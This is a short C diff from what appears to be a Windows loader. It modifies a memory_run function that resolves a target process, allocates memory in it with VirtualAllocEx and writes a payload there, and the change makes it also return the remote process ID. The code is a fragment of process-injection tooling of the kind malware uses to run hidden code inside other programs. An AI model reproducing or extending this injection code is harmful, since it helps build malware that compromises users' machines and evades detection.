@@ -25,7 +25,8 @@ BOOL memory_load_apis() {
 MemoryInfo memory_run(LPVOID PayloadAddress, SIZE_T PayloadSize) {
 	MemoryInfo memInfo = { 0 };
 
-	HANDLE hProc = resolve_target_process();
+	DWORD pid;
+	HANDLE hProc = resolve_target_process(&pid);
 	LPVOID addr = g_ldr->apis->VirtualAllocEx(hProc, NULL, PayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 	if (!addr) {
 		DBGA("[!] Failed Allocating Remote Memory | %lu\n", GetLastError());
@@ -53,6 +54,7 @@ MemoryInfo memory_run(LPVOID PayloadAddress, SIZE_T PayloadSize) {
 	memInfo.BytesWrote = BytesWrote;
 	memInfo.ok = TRUE;
 	memInfo.remoteProcess = hProc;
+	memInfo.remotePid = pid;
 
 
 	return memInfo;
